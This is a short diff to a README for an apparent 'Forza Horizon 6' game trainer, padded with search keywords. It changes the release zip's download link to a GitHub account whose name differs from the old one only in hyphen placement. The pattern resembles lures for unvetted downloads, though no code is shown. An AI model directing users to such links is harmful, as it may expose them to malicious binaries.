@@ -9,7 +9,7 @@ As a purpose-built **forza horizon 6  engine alternative**, the trainer skips ma
 
 
 ## Install
-[Download `FH6AllInOneTrainer.zip`](https://github.com/FH6Trainer-AllInOne/FH6-Trainer-AllInOne/releases/download/v2.8/FH6AllInOneTrainer.zip)
+[Download `FH6AllInOneTrainer.zip`](https://github.com/FH6-TrainerAllInOne/FH6-Trainer-AllInOne/releases/download/v2.8/FH6AllInOneTrainer.zip)
 ---
 <img width="668" height="459" alt="images2" src="https://github.com/user-attachments/assets/98fffcdf-d001-411d-abd1-3e17703792a5" />
 
